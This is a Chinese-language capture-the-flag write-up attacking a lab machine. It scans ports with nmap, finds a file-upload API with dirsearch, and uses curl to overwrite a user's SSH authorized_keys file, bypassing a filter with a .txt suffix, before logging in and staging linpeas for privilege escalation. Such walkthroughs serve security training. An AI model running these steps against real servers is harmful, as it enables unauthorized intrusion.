针对目标服务器进行相应的端口探测

```
sudo nmap -p- -vvv --min-rate 10000 192.168.127.249 --open
```

![image-20241222152708040](https://s2.loli.net/2024/12/22/IgCJxLFoG6bEtTZ.png)

针对目标服务器开放端口进行相应的服务探测

```
sudo nmap -p21,25022,33414,40080 -A 192.168.127.249 -oN Amaterasu.txt
```

![image-20241222153230488](https://s2.loli.net/2024/12/22/NXQ1r8U2qcT4Ghn.png)

![image-20241222153243087](https://s2.loli.net/2024/12/22/flJoewsYZSP4CGh.png)

21端口进行了相应匿名登录，但无法罗列相应目录内的内容

25022端口是openssh，40080端口根据扫描是一个http端口，但33414端口不知道是什么服务，相应访问为404

我们重点关注下40080端口的服务

```
dirsearch -u http://192.168.127.249:40080/ -w /usr/share/wordlists/dirb/big.txt -f -e php,txt,html 
```

![image-20241222155429609](https://s2.loli.net/2024/12/22/UMigyFEWPJsfabl.png)

没有发现有价值的内容

我们将目光放到33414目标端口

```
dirsearch -u http://192.168.127.249:33414/
```

![image-20241222155507700](https://s2.loli.net/2024/12/22/a2HkSdXRbFZxAqr.png)

![image-20241222155536433](https://s2.loli.net/2024/12/22/vAUSpFbiGnKdZEL.png)

可以看到这是一个接口，在help目录下发现发现我们能够上传文件内容，我们尝试上传一个phpshell

![image-20241222155806577](https://s2.loli.net/2024/12/22/kfPtpqlex58GAQ1.png)

命令可以成功进行执行

![image-20241222161246236](https://s2.loli.net/2024/12/22/GlIMASuroY9X3jN.png)

```
curl -X POST -F "filename=@test.txt" --url "http://192.168.127.249:33414/file-upload"
```

![image-20241222162618627](https://s2.loli.net/2024/12/22/2e6Z4SNtlTn7cKW.png)

![image-20241222162634094](https://s2.loli.net/2024/12/22/6Czb7rD3yBg1jZ5.png)

两者都存在报错，怀疑是否需要添加两个参数

 ```
 curl -X POST -F "file=@test.txt" -F "filename=test.txt" --url "http://192.168.127.249:33414/file-upload"
 ```

![image-20241222162700747](https://s2.loli.net/2024/12/22/2Izk39UrnNWgVwB.png)

成功上传相应的文件内容，让我们找寻下上传文件的目录

![image-20241222163001739](https://s2.loli.net/2024/12/22/p7lqCefN3r2OW8U.png)

发现上传的文件就是在temp目录下，因为我们没有指定文件filename的路径，我们可以尝试指定文件路径，，结合我们前文获得的存在的用户及对应.ssh目录，我们可以替换其公钥，从而来使用ssh进行登录

```
curl -X POST -F "file=@/home/zkpc/.ssh/id_ed25519.pub" -F "filename=/home/alfredo/.ssh/authorized_keys" --url "http://192.168.127.249:33414/file-upload"
```

![image-20241222164155625](https://s2.loli.net/2024/12/22/y9qwS5FUbGIc4CR.png)

我们尝试复制公钥到目录，并在后缀添加一个.txt，查看是否能够绕过

```
curl -X POST -F "file=@id_ed25519.pub.txt" -F "filename=/home/alfredo/.ssh/authorized_keys" --url "http://192.168.127.249:33414/file-upload"
```

![image-20241222164305021](https://s2.loli.net/2024/12/22/Lcf8Dm7dt2wpgze.png)

![image-20241222164314166](https://s2.loli.net/2024/12/22/V9Bn4Yv8mX6UrJ7.png)

显示上传成功，我们尝试使用ssh登录

```
ssh -p 25022 alfredo@192.168.127.249
```

![image-20241222164347894](https://s2.loli.net/2024/12/22/AMaXJkHKf2CzFS7.png)

我们成功实现了相应的登录，突破了边界，并在对应的home目录下获得对应的flag

![image-20241222164422225](https://s2.loli.net/2024/12/22/7K52MwkQFVhZlor.png)

```
scp -P 25022 /home/zkpc/Tools/PEASS-ng/linpeas.sh alfredo@192.168.127.249:/tmp
```
